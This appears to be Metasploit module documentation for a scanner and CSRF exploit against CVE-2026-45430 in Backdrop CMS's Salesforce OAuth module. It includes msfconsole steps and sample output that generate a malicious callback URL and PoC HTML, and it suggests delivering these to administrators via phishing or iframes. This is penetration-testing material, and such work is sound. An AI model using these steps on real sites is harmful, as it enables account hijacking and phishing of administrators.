## Vulnerable Application

The Salesforce module for Backdrop CMS versions before `1.x-1.0.1` does not generate
or validate a cryptographically random `state` parameter during the OAuth 2.0
authorization flow. This allows an attacker to perform a Cross-Site Request Forgery
(CSRF) attack that silently links the victim's Backdrop CMS installation to an
attacker-controlled Salesforce account.

- **CVE**: CVE-2026-45430
- **CWE**: 352 (Cross-Site Request Forgery)
- **CVSS**: 7.1 HIGH
- **Fixed in**: Salesforce module 1.x-1.0.1
- **Advisory**: https://backdropcms.org/security/backdrop-sa-contrib-2026-001

### Setting up a vulnerable environment

1. Download and install Backdrop CMS from https://backdropcms.org/
2. Install the Salesforce module (version before 1.x-1.0.1):
   - Download from https://backdropcms.org/project/salesforce
   - Extract to `modules/` directory
   - Enable via Admin > Modules
3. Configure the Salesforce module with a Connected App client ID and secret
   (Admin > Configuration > Salesforce)

The vulnerability is present whenever the Salesforce module is installed and
the OAuth authorize endpoint (`/salesforce/oauth/authorize`) is accessible.

## Verification Steps

### Detection only

1. Start msfconsole
2. Do: `use auxiliary/scanner/http/backdrop_salesforce_csrf`
3. Do: `set RHOSTS <target>`
4. Do: `run`
5. If the target is vulnerable, you will see a `[+] VULNERABLE` or `[+] LIKELY VULNERABLE` message.

### Detection + CSRF payload generation

1. Start msfconsole
2. Do: `use auxiliary/scanner/http/backdrop_salesforce_csrf`
3. Do: `set RHOSTS <target>`
4. Do: `set EXPLOIT true`
5. Do: `set ATTACKER_CODE <your_salesforce_oauth_code>`
6. Do: `run`
7. A CSRF payload URL and a PoC HTML file will be saved to loot.
8. Deliver the URL or HTML file to an authenticated Backdrop administrator
   (e.g. via phishing or malicious iframe).
9. When the admin visits the URL, the CMS will be silently linked to the
   attacker-controlled Salesforce account.

## Options

### RHOSTS

The target host(s) running Backdrop CMS. Accepts a single IP, range, or CIDR block.

### TARGETURI

The base path to the Backdrop CMS installation. (Default: `/`)

### OAUTH_PATH

The path to the Salesforce OAuth authorize endpoint. (Default: `/salesforce/oauth/authorize`)

### CALLBACK_PATH

The path to the Salesforce OAuth callback endpoint, used when generating the CSRF
exploitation payload. (Default: `/salesforce/oauth/callback`)

### MIN_STATE_LENGTH

The minimum length a `state` parameter must have to be considered sufficiently random.
Parameters shorter than this value will be flagged as likely vulnerable. (Default: `16`)

### EXPLOIT

Set to `true` to generate a CSRF exploitation payload when the target is found
vulnerable. Requires `ATTACKER_CODE` to be set. (Default: `false`)

### ATTACKER_CODE

The attacker-controlled Salesforce OAuth authorization code used to build the CSRF
payload. Obtain this by completing the Salesforce OAuth flow against your own
attacker-controlled Connected App.

## Scenarios

### Backdrop CMS with Salesforce module < 1.x-1.0.1 on Linux (detection only)

```
msf6 > use auxiliary/scanner/http/backdrop_salesforce_csrf
msf6 auxiliary(scanner/http/backdrop_salesforce_csrf) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 auxiliary(scanner/http/backdrop_salesforce_csrf) > run

[*] 192.168.1.100:80 - Starting CVE-2026-45430 check on 192.168.1.100
[*] 192.168.1.100:80 - Requesting OAuth authorize endpoint: /salesforce/oauth/authorize
[*] 192.168.1.100:80 - HTTP 302 received
[*] 192.168.1.100:80 - Redirect target: https://login.salesforce.com/services/oauth2/authorize?client_id=...&response_type=code&redirect_uri=...
[+] 192.168.1.100:80 - VULNERABLE: No `state` parameter present in OAuth redirect. The authorization flow has no CSRF protection.
[+] 192.168.1.100:80 - CVE-2026-45430 | Backdrop CMS Salesforce module CSRF | CVSS 7.1 HIGH
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Backdrop CMS with Salesforce module < 1.x-1.0.1 on Linux (with CSRF exploitation)

```
msf6 > use auxiliary/scanner/http/backdrop_salesforce_csrf
msf6 auxiliary(scanner/http/backdrop_salesforce_csrf) > set RHOSTS 192.168.1.100
RHOSTS => 192.168.1.100
msf6 auxiliary(scanner/http/backdrop_salesforce_csrf) > set EXPLOIT true
EXPLOIT => true
msf6 auxiliary(scanner/http/backdrop_salesforce_csrf) > set ATTACKER_CODE aBcDeFgHiJkLmNoPqRsTuVwXyZ
ATTACKER_CODE => aBcDeFgHiJkLmNoPqRsTuVwXyZ
msf6 auxiliary(scanner/http/backdrop_salesforce_csrf) > run

[*] 192.168.1.100:80 - Starting CVE-2026-45430 check on 192.168.1.100
[+] 192.168.1.100:80 - VULNERABLE: No `state` parameter present in OAuth redirect. The authorization flow has no CSRF protection.
[+] 192.168.1.100:80 - CVE-2026-45430 | Backdrop CMS Salesforce module CSRF | CVSS 7.1 HIGH
[+] 192.168.1.100:80 - CSRF Exploitation Payload:
[+] 192.168.1.100:80 -   http://192.168.1.100:80/salesforce/oauth/callback?code=aBcDeFgHiJkLmNoPqRsTuVwXyZ
[+] 192.168.1.100:80 - Deliver this URL to an authenticated Backdrop admin
[+] 192.168.1.100:80 - (e.g. phishing, malicious iframe, or SSRF).
[+] 192.168.1.100:80 - CSRF PoC HTML saved to: /home/user/.msf4/loot/20260523120000_default_192.168.1.100_csrf.poc_123456.html
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

When the authenticated Backdrop administrator visits the crafted callback URL,
the CMS exchanges the attacker's Salesforce OAuth code for an access token,
silently linking the victim's Backdrop installation to the attacker-controlled
Salesforce account.
